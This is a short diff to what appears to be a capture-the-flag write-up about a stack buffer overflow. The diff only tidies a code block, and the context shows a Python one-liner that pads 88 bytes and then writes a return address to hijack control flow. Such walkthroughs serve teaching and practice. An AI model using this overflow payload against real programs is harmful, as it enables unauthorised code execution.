@@ -201,8 +201,7 @@ From the stack frame above, the buffer starts at `RBP - 0x50`, which means the c
 
 **The exploit script:**
 
-```
-cat exploit.py
+```Python
 import sys;
 
 sys.stdout.buffer.write(b"A"*88 + b"\x86\x11\x40\x00\x00\x00\x00\x00")
